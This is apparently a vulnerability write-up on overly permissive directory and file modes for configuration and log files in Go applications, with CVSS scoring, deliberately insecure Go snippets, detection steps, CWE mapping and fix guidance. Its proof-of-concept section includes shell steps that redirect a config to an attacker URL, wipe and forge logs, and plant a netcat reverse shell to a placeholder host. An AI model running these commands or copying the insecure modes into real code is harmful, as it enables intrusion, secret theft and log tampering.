# **Improper Directory Permissions for Configuration and Log Resources in Golang Applications (dir-perms-config-logs)**

## **Severity Rating**

The vulnerability associated with improper directory permissions for configuration and log files in Golang applications, identified as "dir-perms-config-logs," typically presents a **Medium🟡 to High🟠** severity. The precise risk level can fluctuate based on the sensitivity of the data stored and the specific operational environment.

A Common Vulnerability Scoring System (CVSS) v3.1 vector that plausibly represents this vulnerability is:

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

This vector results in a CVSS score of **6.1 (Medium)**. However, if integrity impact is considered higher (e.g., modification of critical configuration leading to further compromise), the score can increase. For instance, a vector of AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (as seen in a related file system permission CVE) scores 7.8 (High). The components are justified as follows:

- **Attack Vector (AV): Local (L)**: Exploitation of overly permissive file or directory settings typically necessitates local access to the system. An attacker would first need to gain some form of foothold on the host, possibly through another vulnerability.
    
- **Attack Complexity (AC): Low (L)**: Once local access is obtained, identifying and accessing files or directories with improper permissions is generally straightforward. No complex methods or specialized conditions are usually required.
- **Privileges Required (PR): Low (L)**: An attacker possessing low-level user privileges on the system can often exploit this vulnerability. It does not typically require administrative rights to read world-readable files or write to world-writable ones.
    
- **User Interaction (UI): None (N)**: Exploitation does not require any action or participation from a legitimate user. The attacker can interact directly with the misconfigured file system resources.
- **Scope (S): Unchanged (U)**: The vulnerability and its direct impact are generally confined to the security scope of the compromised system (the application server itself). A successful exploit does not, by itself, allow the attacker to affect components beyond this scope.
- **Confidentiality (C): High (H)**: Configuration files frequently store highly sensitive information such as database credentials, API keys, private encryption keys, or deployment parameters. Log files can contain Personally Identifiable Information (PII), session tokens, detailed error messages revealing internal application architecture, or other operational secrets. Unauthorized read access due to permissive settings can lead to a significant breach of confidentiality.

- **Integrity (I): Low (L)**: If write permissions are improperly set (e.g., world-writable), an attacker could modify configuration files to alter application behavior, potentially redirecting data, disabling security features, or injecting malicious parameters. Log files could be tampered with to hide malicious activity or inject misleading information. The "Low" rating here reflects that direct code execution or full system integrity compromise isn't always immediate from just file modification, but it can be a stepping stone. If modification leads to more severe compromise, this could be rated higher.

- **Availability (A): None (N)**: The direct impact on availability is often minimal. However, if critical configuration files are deleted or corrupted due to write access, or if world-writable log directories are filled to exhaust disk space, some level of service degradation or denial could occur. For this baseline assessment, it's considered None, but specific scenarios could warrant a Low rating.

It is important to recognize that while the Attack Vector is Local, this does not diminish the potential severity. File permission vulnerabilities are frequently exploited as a secondary step after an attacker gains initial, perhaps low-privileged, access to a system via other means (e.g., a remote code execution flaw in another service). In such scenarios, improper permissions on sensitive files like configurations and logs become critical enablers for privilege escalation, data exfiltration, or lateral movement. Developers and system administrators might sometimes underestimate the risk of locally exploitable vulnerabilities, but a defense-in-depth strategy mandates robust protection of local resources.

**Table 1: CVSS 3.1 Vector Breakdown**

| **Metric** | **Value** | **Justification** |
| --- | --- | --- |
| Attack Vector | Local (L) | Exploitation requires prior access to the local system. |
| Attack Complexity | Low (L) | Exploiting overly permissive settings is generally not complex once local access is gained. |
| Privileges Required | Low (L) | Often exploitable by users with basic, non-privileged access to the system. |
| User Interaction | None (N) | No interaction from a legitimate user is typically needed for exploitation. |
| Scope | Unchanged (U) | The vulnerability's impact is generally limited to the compromised system's security scope. |
| Confidentiality | High (H) | Configuration and log files often contain highly sensitive data (credentials, PII, API keys), leading to significant data disclosure if read.  |
| Integrity | Low (L) | Allows modification of configuration or log files, potentially altering application behavior or hiding malicious activity. Can be higher depending on the specific file and its role.  |
| Availability | None (N) | Direct impact on availability is less common but possible if critical files are deleted/corrupted. |

## **Description**

The "Improper Directory Permissions for Configuration and Log Resources in Golang Applications" vulnerability (dir-perms-config-logs) arises when Golang applications create or manage directories and files—specifically those intended for storing configuration data (e.g., `config.json`, `app.yaml`, `.env` files) or application logs (e.g., `application.log`, `debug.log`)—with file system permissions that are overly permissive.

At its core, the problem is that these lax permission settings (such as world-writable or world-readable attributes) grant unauthorized users or processes on the host operating system the ability to access these resources in ways that were not intended by the application designers or system administrators. For instance, a configuration file might be readable by any user on the system, or a log directory might allow any user to write or delete files within it.

This type of misconfiguration can lead to a variety of negative security outcomes. These include, but are not limited to, the unauthorized disclosure of sensitive information (suchas credentials or personal data), illicit modification of system or application configurations (potentially leading to further compromise or malfunction), denial of service, or the ability for an attacker to tamper with log entries to obfuscate their malicious activities or mislead investigators.

One reason this vulnerability can be insidious is its often "silent" nature. An application with improperly set permissions for its configuration or log files will typically function correctly from an operational standpoint. There are no immediate crashes or functional errors that would alert developers or operators to the underlying security risk. This lack of immediate negative feedback makes it easy for such misconfigurations to be overlooked during development, testing, and even in production environments unless specifically sought out through security audits or static analysis. The rise of containerization technologies (like Docker) and complex deployment orchestration (like Kubernetes) can inadvertently contribute to such issues. Developers, facing complexities with user and group ID mapping between containers and hosts, or within multi-stage build processes, might resort to setting overly permissive permissions (e.g., `0777`) as a quick workaround to ensure the application "just works." While this might resolve an immediate operational hurdle, it can translate to significant security risks if container volumes are mounted from the host insecurely, or if the container itself is compromised, allowing processes within to leverage these broad permissions against the host or other collocated containers.

## **Technical Description (for security pros)**

Understanding this vulnerability requires a foundational knowledge of Unix-like file system permissions and how Golang's standard library interacts with them.

Unix/Linux File Permissions:

In Unix-like systems, permissions are managed for three classes of users: the owner of the file/directory, users belonging to the file/directory's group, and others (all other users). For each class, three basic permissions can be granted or denied:

- **Read (r)**: Allows viewing the contents of a file or listing the contents of a directory.
- **Write (w)**: Allows modifying or deleting a file, or creating, deleting, and renaming files within a directory.
- **Execute (x)**: Allows running a file as a program, or accessing (i.e., `cd`ing into) a directory.

These permissions are commonly represented in octal notation (e.g., `0755`). Each digit corresponds to owner, group, and others, respectively. The digit itself is a sum of the values for read (4), write (2), and execute (1). For example:

- `0700` (rwx------): Owner has read, write, execute; group and others have no permissions.
- `0755` (rwxr-xr-x): Owner has rwx; group and others have read and execute.
- `0777` (rwxrwxrwx): Owner, group, and others all have read, write, and execute permissions. This is highly permissive and generally insecure for most files and directories.
    
- `0600` (rw-------): Owner has read and write for a file.
- `0644` (rw-r--r--): Owner has read/write; group and others have read-only for a file.
- `0666` (rw-rw-rw-): Owner, group, and others all have read and write permissions for a file. This is also generally insecure.

Golang os Package Interaction:

Golang's standard os package provides functions for file system operations, including creating files and directories with specific permissions:

- `os.Mkdir(name string, perm os.FileMode)` and `os.MkdirAll(path string, perm os.FileMode)`: These functions create directories. The `perm` argument specifies the permission mode (e.g., `0755`). If `0777` is used, it attempts to grant read, write, and execute permissions to owner, group, and others. This is a common source of the vulnerability if not chosen carefully.
    
- `os.OpenFile(name string, flag int, perm os.FileMode)`: This function can create a new file if it doesn't exist (when `os.O_CREATE` flag is used). The `perm` argument sets the permissions for the newly created file. Using modes like `0666` or `0644` for sensitive log or config files can be problematic.
    
- `os.Chmod(name string, mode os.FileMode)`: This function changes the permissions of an existing file or directory. While it can be used to correct permissions, it can also be misused to set insecure ones.
    

The umask Influence:

A critical aspect often misunderstood by developers is the role of the process's umask (user file creation mode mask). The umask is an octal value that specifies permissions that should be removed from the default permissions when a new file or directory is created. The actual permissions set are typically (perm & ^umask).13 For example, if Go code specifies os.MkdirAll("somedir", 0777) and the process umask is 0022 (a common default, removing write permission for group and others), the resulting directory permissions will be 0755 (rwxr-xr-x), not 0777.

While umask can inadvertently mitigate an overly permissive perm argument, relying on it for security is a poor practice. Code should always explicitly define the intended, secure permissions, adhering to the principle of least privilege. Developers might observe that their specified 0777 does not result in actual 0777 permissions and might develop a false sense of security or misunderstand how permissions are truly determined, believing Go or the system is "auto-correcting" it. This subtlety underscores the need for explicit and correct permission setting in the code itself.

**Specific Risks:**

- **Configuration Files (e.g., `app.conf`, `credentials.json`)**:
    - **World-readable (`0644`, `0666`, `0755` for parent dir)**: Can expose database credentials, API keys, encryption keys, session secrets, internal IP addresses, or other sensitive operational parameters to any user on the system.

    - **World-writable (`0666`, `0777` for parent dir)**: Allows any user to modify configurations, potentially redirecting the application to malicious endpoints, disabling security features, altering business logic parameters, or causing denial of service.
- **Log Files (e.g., `access.log`, `error.log`)**:
    - **World-readable (`0644`, `0666`)**: Can expose PII, session tokens, sensitive operational data (like query parameters), detailed error messages revealing internal vulnerabilities or system paths, and user activity patterns.
        
    - **World-writable (`0666`)**: Allows any user to tamper with log entries to hide their tracks, inject false information to mislead administrators, or potentially fill up disk space if the log directory is also world-writable and not size-limited.

        

Static analysis tools might flag explicit overly permissive constants like `0777`. However, detection becomes more complex if permissions are derived from insecure configurations or set conditionally, especially when factoring in the `umask`. Robust detection requires a deeper understanding of the `os` package usage and the runtime environment.

## **Common Mistakes That Cause This**

This vulnerability often stems from a combination of developer oversight, environmental complexities, and a misunderstanding of security principles. Key common mistakes include:

1. **Developer Oversight and Lack of Awareness**: The most frequent cause is developers setting permissions to highly permissive values like `0777` for directories or `0666` (or even `0644` for sensitive files) out of convenience during development or due to a lack of understanding of the security implications. The goal might be to quickly get the application running without encountering permission-denied errors, deferring security considerations. This often reflects a conflict between the pressure for development speed and the rigor required for security.
    
2. **Copy-Pasting Code**: Developers might use code examples from online tutorials, forums, or internal projects that employ insecure default permissions, without critically evaluating these settings for their specific context.
3. **Ignoring the Principle of Least Privilege**: A fundamental security tenet is to grant only the minimum permissions necessary for an entity (user, process, or application) to perform its intended function. This vulnerability is a direct violation of this principle, where applications are given, or give themselves, broader access rights than required.

4. **Misunderstanding or Over-relying on `umask`**: Some developers might be unaware of how the process `umask` interacts with the mode bits specified in Go's file creation functions. Others might incorrectly assume that a system's default `umask` will always provide sufficient restriction, thus not specifying explicit, secure permissions in their code. Relying on ambient system settings for security is not a robust approach.

    
5. **Debugging Leftovers**: During development or troubleshooting, permissions might be temporarily widened to facilitate debugging (e.g., making log files world-readable for easy inspection by multiple team members). If these temporary settings are not reverted before deployment, they become production vulnerabilities.
6. **Environmental Complexity and "Quick Fixes"**: In containerized environments (like Docker) or when dealing with different user/group ownership in CI/CD pipelines or multi-user systems, developers might encounter permission errors. Setting overly broad permissions (e.g., `chmod 777` in a Dockerfile or deployment script) can appear as a "quick fix" to resolve these issues without addressing the underlying user/group mapping complexities.
7. **Default Permissions of Third-Party Libraries**: Some third-party logging libraries or utility packages that handle file I/O might, if not configured explicitly for file output permissions, use system defaults or create files/directories with permissions that are too permissive for sensitive data. While specific default creation permissions for popular Go logging libraries like Logrus or Zap are not detailed as insecure in the provided materials , it remains an area where developers must exercise caution and verify the behavior of any library that creates files or directories. For instance, `lfshook` for Logrus notes that the user running the Go application must have appropriate permissions for log files and target directories.
    

The Go standard library's `os` package functions, by requiring an explicit `perm` argument for file and directory creation, place the responsibility of choosing secure permissions squarely on the developer. While this offers flexibility, it also means that without adequate security awareness or secure-by-default guidance within frameworks, these simple misconfigurations can easily occur.

## **Exploitation Goals**

Attackers who identify and exploit improper directory or file permissions for configuration and log resources typically aim to achieve one or more of the following goals:

1. **Information Disclosure / Data Exfiltration**: This is often the primary goal.
    - **Read Sensitive Configuration Data**: Attackers seek to read configuration files (e.g., `.json`, `.yaml`, `.env`, `.ini`) to obtain API keys, database connection strings (username, password, host), private encryption keys, session management secrets, internal network topology details, or other credentials. This information can be directly used to access other systems or escalate privileges.
        
    - **Read Sensitive Log Data**: Log files can contain a wealth of sensitive information, including user Personally Identifiable Information (PII), session identifiers, access tokens, cleartext passwords (if improperly logged), detailed error messages that reveal internal application structure or vulnerabilities, SQL queries, or user activity patterns. Attackers read these logs to gather intelligence, steal data, or plan further attacks.
        
2. **Unauthorized Modification / Tampering**: If write permissions are overly permissive, attackers can alter files.
    - **Modify Configuration Files**: By modifying configuration files, an attacker can change application behavior. This could involve redirecting data flows to attacker-controlled servers, disabling security features (like authentication or logging), changing application logic parameters to bypass controls, or pointing the application to malicious dependencies.
        
    - **Tamper with Log Files**: Attackers may modify or delete log entries to erase evidence of their malicious activities, making forensic analysis difficult. They might also inject false log entries to mislead administrators or trigger bogus alerts, creating noise to hide actual intrusions.

3. **Privilege Escalation**:
    - If configuration files control execution paths (e.g., specifying paths to scripts or binaries) and are writable, an attacker might modify these paths to point to malicious executables. If these are later run by a process with higher privileges, it can lead to privilege escalation.
    - Similarly, if an attacker can write an executable script to a world-writable directory from which a higher-privilege process (e.g., a cron job) executes files, this can also lead to privilege escalation.
4. **Denial of Service (DoS)**:
    - Corrupting or deleting critical configuration files can render the application unusable or unstable.
    - While less direct for this specific vulnerability, if a log directory is world-writable, an attacker could potentially fill the disk partition by writing excessively large amounts of data to logs, leading to a DoS for the application or the entire system.
5. **Lateral Movement**:
    - Information obtained from configuration files, such as credentials for databases, message queues, or other backend services, can be used by an attacker to move laterally within the network and compromise additional systems.

The information or access gained from exploiting improper file permissions often serves as a crucial pivot point in a broader attack chain. For instance, credentials read from a world-readable configuration file might allow an attacker to access a sensitive database, from which they can exfiltrate large volumes of data or launch further attacks. Automated attack tools and scripts frequently include modules to scan for common configuration file names and check for insecure permissions as part of their post-exploitation reconnaissance phase, making these misconfigurations attractive, low-hanging fruit.

## **Affected Components or Files**

The vulnerability of improper directory permissions primarily impacts files and directories that are created and managed by Golang applications for storing operational data. The key affected components include:

1. **Configuration Files**: These are files that store settings and parameters required for the application to run. Overly permissive settings on these files can be highly dangerous due to the sensitive nature of their typical contents.
    - Examples: `.json` (e.g., `config.json`, `settings.json`), `.yaml` or `.yml` (e.g., `app.yaml`, `database.yml`), `.toml` (e.g., `config.toml`), `.ini` files, `.env` files (environment configuration), custom-formatted configuration files, XML configuration files.
    - Content often includes: Database connection strings, API keys, secret keys for encryption or session management, service account credentials, external service endpoints, feature flags, application behavior parameters.
        
    - The naming conventions for these files (e.g., `prod.conf`, `db_credentials.json`) can sometimes make them easier for attackers to locate during reconnaissance if they gain initial system access, although security should never rely on obscurity.
2. **Log Files**: These files record events, errors, and transactions occurring within the application.
    - Examples: Application logs (`app.log`), error logs (`error.log`), access logs (`access.log`), debug logs (`debug.log`), audit trails.
    - Content often includes: Timestamps, event descriptions, user identifiers, IP addresses, request parameters (which may include sensitive data), session IDs, stack traces, PII (if improperly logged), and other operational details.

3. **Directories Containing Configuration and Log Files**: The permissions of the parent directories are as crucial as the files themselves. If a directory is overly permissive (e.g., world-writable), an attacker might be able to create, delete, or rename files within it, even if individual files have more restrictive permissions.
    - Examples: `/app/config/`, `/var/log/myapp/`, `logs/`, `conf/`.
4. **Temporary Files and Directories**: Although a slightly broader category, if a Golang application creates temporary files or directories that transiently store sensitive configuration data or log-like information, and these are created with improper permissions, they also fall under the scope of this risk. Secure management of temporary files is essential.
5. **Application Binaries or Scripts (Indirectly)**:
    - While not directly about the permissions of the binary itself, if a world-writable configuration file can dictate paths from which the application loads other binaries, plugins, or scripts, an attacker could modify this config to cause the application to execute malicious code.
    - If log directories are world-writable and an attacker can fill the disk by writing excessively to them, this could lead to a denial of service that impacts the availability of the application.

The proliferation of microservice architectures can increase the number of configuration files across an environment. If each microservice team independently manages deployment scripts and file permission settings without adhering to a centralized, secure policy, the likelihood of inconsistencies and vulnerabilities related to improper permissions can rise, expanding the overall attack surface.

## **Vulnerable Code Snippet**

The following Go code snippets illustrate common ways this vulnerability can be introduced through the use of the `os` package with overly permissive permission modes.

**Example 1: Using `os.MkdirAll` with Overly Permissive Permissions for a Configuration Directory**

This snippet demonstrates creating a directory intended to hold configuration files with `0777` permissions, which grants read, write, and execute access to the owner, group, and all other users on the system.

```Go

package main

import (
	"log"
	"os"
)

func setupConfigDir() {
	configDirPath := "/app/config"
	// Vulnerable: 0777 permissions (rwxrwxrwx) are too broad for a config directory.
	// Any user on the system can read, write, and list files in this directory.
	err := os.MkdirAll(configDirPath, 0777)
	if err!= nil {
		log.Fatalf("Failed to create config directory '%s': %v", configDirPath, err)
	}
	log.Printf("Config directory '%s' created or already exists.", configDirPath)

	// Imagine a subsequent step where a config file is written into this directory.
	// If /app/config/settings.json is created, its accessibility is influenced
	// by its own permissions and the directory's world-writable nature.
	// An attacker could potentially place their own files here or modify existing ones
	// if file permissions also allow it, or delete files.
}

func main() {
	setupConfigDir()
	//... application continues...
}
```

This pattern is problematic because it allows any user on the system to potentially list, read, create, modify, or delete files within the `/app/config` directory, depending on the permissions of the files themselves.

**Example 2: Using `os.OpenFile` with Overly Permissive Permissions for a Log File**

This snippet shows opening (and potentially creating) a log file with `0666` permissions. This mode grants read and write access to the owner, group, and all other users.

```Go

package main

import (
	"log"
	"os"
)

func setupLogging() {
	logFilePath := "/app/logs/application.log"
	// Ensure the log directory exists (ideally with secure permissions, e.g., 0700 or 0750)
	logDir := "/app/logs"
	// For brevity, assuming logDir is created securely elsewhere or using default restrictive umask.
	// A more complete example would also show os.MkdirAll(logDir, 0700)
	if _, err := os.Stat(logDir); os.IsNotExist(err) {
		// Example: Creating log directory with more secure permissions
		if mkdirErr := os.MkdirAll(logDir, 0750); mkdirErr!= nil {
			 log.Fatalf("Failed to create log directory '%s': %v", logDir, mkdirErr)
		}
	}

	// Vulnerable: 0666 permissions (rw-rw-rw-) are too broad for a log file.
	// Any user on the system can read sensitive log data or tamper with log entries.
	logFile, err := os.OpenFile(logFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err!= nil {
		log.Fatalf("Failed to open log file '%s': %v", logFilePath, err)
	}
	// 'defer logFile.Close()' should be in the function that uses it or when logger is shutdown.
	// For this example, we'll set it as the global log output.
	log.SetOutput(logFile)
	// Note: The actual logFile.Close() would typically be handled at application shutdown.
	log.Println("Application logging initialized. Log entries will be written with rw-rw-rw- permissions.")
}

func main() {
	setupLogging()
	log.Println("Application started.")
	//... application logic...
	log.Println("Application shutting down.")
}
```

With `0666` permissions, any user on the system could potentially read sensitive information logged by the application or modify/truncate the log file to hide malicious activity.

These vulnerabilities often appear in application initialization code or utility functions responsible for setting up the runtime environment. Such code might be written early in the development lifecycle and not subsequently reviewed with a strong security focus. The apparent simplicity of the permission parameter (a single octal number) can be deceptive, masking the significant security implications of an incorrect choice. It highlights that critical vulnerabilities can arise from simple misconfigurations of fundamental operating system primitives rather than complex logical flaws.

## **Detection Steps**

Identifying improper directory and file permissions for configuration and log resources in Golang applications requires a multi-faceted approach, combining static code analysis, runtime verification, and configuration reviews.

1. **Manual Code Review**:
    - Thoroughly inspect the Golang source code for invocations of file system manipulation functions from the `os` package, primarily:
        - `os.Mkdir(name string, perm os.FileMode)`
        - `os.MkdirAll(path string, perm os.FileMode)`
        - `os.OpenFile(name string, flag int, perm os.FileMode)` (especially when the `os.O_CREATE` flag is used)
        - `os.Chmod(name string, mode os.FileMode)`
    - Pay close attention to the `perm` (or `mode`) argument passed to these functions. Look for octal values that grant excessive permissions to 'group' or 'others'. Common insecure patterns include `0777`, `0775` (for directories if 'others' execute/read is not needed), `0666`, `0664`, `0644` (for sensitive files where 'others' read is not needed).
    - Analyze how the permission values are derived. Are they hardcoded, taken from configuration, or calculated? This can help understand if the insecure permission is systemic or conditional.
2. **Static Application Security Testing (SAST)**:
    - Employ SAST tools that are capable of analyzing Golang code for security vulnerabilities. Many modern SAST solutions include checks for insecure file permission settings.
    - Specific SAST rules to look for or configure would include those that flag overly permissive modes in `os.Mkdir*` and `os.OpenFile` calls. For example, Datadog's SAST includes the rule `go-security/mkdir-permissions` which targets `os.Mkdir` and `os.MkdirAll` calls using permissions like `0777`. Prisma Cloud offers a similar policy, `CKV3_SAST_249` (Excessive directory permissions in Go applications), which flags permissions greater than `0750` for `os.Mkdir` and `os.MkdirAll`.
    - Tools like `gosec` can also be utilized, as they often check for a range of Common Weakness Enumerations (CWEs), some ofwhich relate to improper permissions.
        
3. **Dynamic Analysis and Runtime Verification**:
    - After the application is deployed (even in a staging or testing environment), inspect the actual permissions of the created configuration and log directories and files on the file system. This is crucial because the final permissions are a result of the mode specified in the code *and* the `umask` of the process that executed the code.
    - Use standard operating system commands for inspection:
        - `ls -l <path_to_file_or_dir>`: Displays permissions in symbolic notation (e.g., `drwxrwxrwx`).
        - `stat <path_to_file_or_dir>`: Provides detailed status information, including octal permissions.
        - `namei -l <path_to_dir_or_file>`: Recursively lists permissions for each component of a path.
            
    - Verify that the runtime permissions align with the principle of least privilege and the intended access controls.
4. **Configuration and Deployment Script Review**:
    - Examine deployment scripts (e.g., shell scripts, Ansible playbooks, Chef recipes, Puppet manifests) and container definitions (e.g., Dockerfiles) for any commands that might set or alter file permissions (e.g., `chmod`, `chown`). A secure permission set in Go code can be overridden by insecure commands during deployment.
        
    - Pay attention to `RUN chmod` instructions in Dockerfiles or similar constructs in orchestration tools.
5. **Third-Party Logging Library Configuration Review**:
    - If the application uses third-party logging libraries that manage their own file creation (e.g., libraries that handle log rotation and output to files), review their documentation and configuration settings. Ensure these libraries are configured to create log files and directories with secure, restrictive permissions. For instance, `lfshook`, a hook for the Logrus library, notes that the user running the Go application must have appropriate read/write permissions to the selected log files and, if files don't exist, to the target directory. The default behavior of such libraries regarding file permissions should be explicitly verified.

A combination of these detection methods provides the most comprehensive coverage. SAST can identify potential issues directly in the source code, while runtime verification confirms the actual permissions in the deployed environment, accounting for factors like `umask` and deployment script modifications. Integrating these checks into CI/CD pipelines is essential for early and consistent detection, preventing these vulnerabilities from reaching production systems.

## **Proof of Concept (PoC)**

This Proof of Concept demonstrates how an attacker with low-privileged local access to a system can exploit improperly set directory and file permissions for configuration and log files created by a Golang application.

Scenario:

A Golang web application, when started, creates:

1. A configuration directory at `/app/config` with `0777` (rwxrwxrwx) permissions.
2. A configuration file `/app/config/settings.json` within this directory, also created with world-writable permissions (e.g., `0666` or inherited due to directory permissions and umask). This file contains a (fictional) setting for an external service URL.
3. A log file at `/app/logs/app.log` with `0666` (rw-rw-rw-) permissions. This log file records sensitive operations, including (hypothetically) user session IDs.

**Assumptions**:

- The Golang application has run and created these resources with the specified insecure permissions.
- An attacker has gained local shell access to the server as a non-root, low-privileged user (e.g., `attacker_user`).

Step 1: Reconnaissance (Attacker)

The attacker, having gained local access, explores the file system for misconfigured files and directories.

```Bash

# Attacker's shell
attacker_user@server:~$ ls -ld /app/config
drwxrwxrwx 2 app_user app_group 4096 Oct 26 10:00 /app/config

attacker_user@server:~$ ls -l /app/config/settings.json
-rw-rw-rw- 1 app_user app_group 128 Oct 26 10:00 /app/config/settings.json

attacker_user@server:~$ ls -l /app/logs/app.log
-rw-rw-rw- 1 app_user app_group 2048 Oct 26 10:01 /app/logs/app.log
```

The output confirms that `/app/config` is world-writable and world-executable, and both `settings.json` and `app.log` are world-readable and world-writable.

**Step 2: Exploiting Configuration File (Information Disclosure & Tampering)**

- **Read sensitive configuration**:
    
    ```Bash
    
    attacker_user@server:~$ cat /app/config/settings.json
    {
      "service_url": "https://api.internal.corp/data",
      "api_key": "supersecretkey123",
      "feature_x_enabled": true
    }
    ```
    
    *Outcome*: Attacker obtains the `api_key` and internal `service_url`.
    
- **Modify configuration**: The attacker decides to redirect service calls to their own server or disable a feature.
    
    ```Bash
    
    attacker_user@server:~$ echo '{"service_url": "https://attacker-controlled.com/collect", "api_key": "supersecretkey123", "feature_x_enabled": false}' > /app/config/settings.json
    ```
    
    *Outcome*: The next time the Golang application reads its configuration, it will use the attacker-controlled URL, potentially sending sensitive data to the attacker. `feature_x_enabled` is now false. The application's behavior is altered.
    

**Step 3: Exploiting Log File (Information Disclosure & Tampering)**

- **Read sensitive logs**:
    
    ```Bash
    
    attacker_user@server:~$ cat /app/logs/app.log
    2023-10-26 10:00:00 INFO: Application started.
    2023-10-26 10:00:05 INFO: User 'admin' logged in with session ID 'sess_abc123def456'.
    2023-10-26 10:00:10 ERROR: Failed to process payment for user 'john_doe'.
    ```
    
    *Outcome*: Attacker obtains a valid session ID for the 'admin' user, which could be used for session hijacking if other conditions permit. They also gain insights into application errors and user activity.
    
- **Tamper with logs**: The attacker attempts to hide their presence or mislead administrators.
    
    ```Bash
    
    # Clear the log file
    attacker_user@server:~$ > /app/logs/app.log
    # Or inject misleading entries
    attacker_user@server:~$ echo "2023-10-26 10:05:00 INFO: All systems nominal. No suspicious activity detected by user 'attacker_user'." >> /app/logs/app.log
    ```
    
    *Outcome*: Evidence of attacker activity or legitimate errors might be lost, or false information injected, hindering incident response.
    

Step 4: Potential for Further Exploitation (Leveraging Directory Permissions)

Since /app/config is world-writable (drwxrwxrwx), the attacker can create files in it.

```Bash

attacker_user@server:~$ echo '#!/bin/bash' > /app/config/malicious_script.sh
attacker_user@server:~$ echo 'nc -e /bin/bash attacker-ip 4444' >> /app/config/malicious_script.sh # Example reverse shell
attacker_user@server:~$ chmod +x /app/config/malicious_script.sh
```

*Outcome*: If any process (e.g., a cron job running as root, or the application itself if it's designed to execute scripts from this directory based on some configuration) executes scripts from `/app/config`, the attacker could achieve remote code execution with the privileges of that process.

This PoC illustrates that the impact of improper permissions is not just theoretical access but can lead to concrete outcomes like data theft, configuration manipulation, log tampering, and potentially further system compromise. The effectiveness and severity of the exploit depend heavily on what sensitive information is stored in the affected files and how the application utilizes them. For instance, reading a config file with a publicly known, non-sensitive API key has minimal impact, whereas reading one with database superuser credentials can be catastrophic. Similarly, modifying a config file that only changes a UI theme is less severe than modifying one that disables authentication checks.

## **Risk Classification**

The vulnerability of improper directory and file permissions for configuration and log resources in Golang applications can be classified using standard industry taxonomies, which helps in understanding its nature and prioritizing remediation efforts.

**Common Weakness Enumeration (CWE) Mapping**:

- **CWE-276: Incorrect Default Permissions**: This is a very direct mapping. The vulnerability often arises because the default permissions assigned during the creation of files or directories by the Golang application are too lax, granting wider access than necessary. For example, using `os.MkdirAll` with `0777` or `os.OpenFile` with `0666` sets insecure default permissions for those specific resources.

- **CWE-732: Incorrect Permission Assignment for Critical Resource**: Configuration files (containing credentials, API keys, system settings) and log files (containing PII, operational data, error details) are undoubtedly critical resources. Assigning overly permissive access (e.g., world-readable or world-writable) to them falls squarely under this CWE. The OWASP Web Security Testing Guide also references CWE-732 in the context of testing file permissions.
    
- **CWE-284: Improper Access Control**: File system permissions are a fundamental mechanism of access control. When these permissions are set incorrectly, it leads to improper access control, allowing unauthorized actors to perform actions (read, write, execute) that they should be denied.
    
- **CWE-532: Insertion of Sensitive Information into Log File**: While this CWE primarily deals with the act of logging sensitive data, improper permissions that make such logs readable by unauthorized parties exacerbate the risk. If logs containing sensitive information are world-readable due to `dir-perms-config-logs`, the impact of CWE-532 is significantly amplified.

The presence of multiple relevant CWEs underscores that this vulnerability touches upon several fundamental security principles, including secure defaults, the principle of least privilege, and robust access control for critical system components.

**Table 2: Associated Common Weakness Enumerations (CWEs)**

| **CWE ID** | **CWE Name** | **Relevance to Improper Directory Permissions** |
| --- | --- | --- |
| CWE-276 | Incorrect Default Permissions | Directly applicable when Golang code creates config/log files or directories with overly permissive default modes (e.g., `0777`, `0666`). |
| CWE-732 | Incorrect Permission Assignment for Critical Resource | Config and log files are critical resources. Assigning them world-readable/writable permissions is an incorrect assignment.  |
| CWE-284 | Improper Access Control | File permissions are a form of access control; overly permissive settings break this control.  |
| CWE-532 | Insertion of Sensitive Information into Log File | If logs contain sensitive data, improper read permissions (due to this vulnerability) make that data accessible, increasing the impact of CWE-532. |

**OWASP Top 10 Mapping (e.g., OWASP Top 10 2021)**:

- **A01:2021 – Broken Access Control**: Improperly configured file system permissions are a classic example of broken access control. They allow users or processes to access resources (config files, log files) that they should not have permissions for, potentially leading to unauthorized information disclosure, modification, or destruction.

- **A05:2021 – Security Misconfiguration**: Setting incorrect file permissions during application setup or runtime is a security misconfiguration. This category broadly covers failures to implement all appropriate security configurations or implementing them insecurely.

**Likelihood and Impact**:

- **Likelihood**: Can range from **Medium to High**. It depends on factors such as the ease with which an attacker can gain local access to the system (often a prerequisite) and the prevalence of such misconfigurations. Given that it's a common developer oversight, the likelihood of the misconfiguration existing can be high.
- **Impact**: Can range from **Medium to High**.
    - **Confidentiality Impact**: Often High, especially if configuration files contain credentials (API keys, database passwords) or log files contain PII or session tokens.
    - **Integrity Impact**: Can be Medium to High if configuration files can be modified to alter critical application behavior, or if logs can be tampered with to hide evidence or inject false data.
    - **Availability Impact**: Generally Low to Medium, but could be higher if critical configuration files are deleted or if disk exhaustion occurs due to writable log directories.

The classification under OWASP A01 (Broken Access Control) and A05 (Security Misconfiguration) emphasizes that this is not merely a "coding bug" but also an issue related to secure system design, deployment configuration, and adherence to fundamental access control principles. Addressing it requires a holistic approach that encompasses the entire software development and operational lifecycle.

## **Fix & Patch Guidance**

Addressing the "Improper Directory Permissions for Configuration and Log Resources" vulnerability in Golang applications requires adherence to the principle of least privilege and careful use of Go's `os` package functions.

Core Principle: Least Privilege

The guiding principle for remediation is least privilege: files and directories should be created with the minimum set of permissions necessary for the application and legitimate administrative processes to function correctly. All other access should be denied by default.10

Recommended Permissions:

The following are generally recommended secure baseline permissions. Specific needs might require slight adjustments (e.g., specific group access), but "others" permissions should almost always be minimized or eliminated for sensitive files.

**Table 3: Recommended Permissions for Configuration and Log Resources**

| **Resource Type** | **Recommended Octal Permission** | **Symbolic** | **Rationale / Primary Accessors** |
| --- | --- | --- | --- |
| Config Directory | `0700` | `rwx------` | Owner (application user) has full control. No access for group or others. This is the most restrictive and generally preferred for directories holding sensitive configs. |
|  | `0750` | `rwxr-x---` | Owner has full control; a specific group (e.g., administrators, deployment group) can read and traverse. No access for others. Use if a trusted group needs access.  |
| Config File | `0600` | `rw-------` | Owner (application user) can read and write. No access for group or others. This is the most restrictive and generally preferred for sensitive config files.|
|  | `0640` | `rw-r-----` | Owner can read/write; a specific group can read. No access for others. Use if a trusted group needs read-only access. |
| Log Directory | `0700` | `rwx------` | Owner (application user writing the logs) has full control. |
|  | `0750` | `rwxr-x---` | Owner has full control; a specific group (e.g., log shippers, monitoring agents) can read and traverse. |
| Log File | `0600` | `rw-------` | Owner (application user writing the logs) can read and write. |
